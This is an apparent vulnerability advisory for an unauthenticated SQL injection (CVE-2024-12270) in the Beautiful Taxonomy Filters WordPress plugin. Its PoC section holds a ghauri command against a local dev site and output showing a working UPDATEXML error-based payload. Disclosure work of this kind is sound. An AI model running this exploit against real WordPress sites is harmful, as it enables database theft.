# CVE-2024-12270
Beautiful Taxonomy Filters <= 2.4.3 - Unauthenticated SQL Injection

# Description

The Beautiful taxonomy filters plugin for WordPress is vulnerable to SQL Injection via the 'selects[0][term]' parameter in all versions up to, and including, 2.4.3 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query.  This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.

## Details

- **Type**: plugin
- **Slug**: beautiful-taxonomy-filters
- **Affected Version**: 2.4.3
- **CVSS Score**: 7.5
- **CVSS Rating**: High
- **CVSS Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
- **CVE**: CVE-2024-12270
- **Status**: Closed

POC
---

```
ghauri -u 'https://wp-dev.ddev.site:443/wp-admin/admin-ajax.php' --data='action=update_filters_callback&selects[0][term]=1&selects[0][operator]=AND&selects[1][term]=1&selects[1][operator]=AND&nonce=d6180bd74e' --level=3 --dbms='mysql'
```

```
[13:21:20] [INFO] POST parameter 'selects[0][term]' appears to be 'MySQL >= 5.1 AND string error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)' injectable
POST parameter 'selects[0][term]' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n

Ghauri identified the following injection point(s) with a total of 675 HTTP(s) requests:
---
Parameter: selects[0][term] (POST)
    Type: error-based
    Title: MySQL >= 5.1 AND string error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)
    Payload: action=update_filters_callback&selects[0][term]=1 AND UPDATEXML(0,CONCAT_WS('(', '~','r0oth3x49','~'),0)-- wXyW&selects[0][operator]=AND&selects[1][term]=1&selects[1][operator]=AND
---
[13:21:25] [INFO] testing MySQL
[13:21:25] [INFO] confirming MySQL
[13:21:25] [INFO] the back-end DBMS is MySQL

[13:21:25] [INFO] fetched data logged to text files under '/Users/me/.ghauri/wp-dev.ddev.site'

[*] ending @ 13:21:25 /2024-12-09/
````
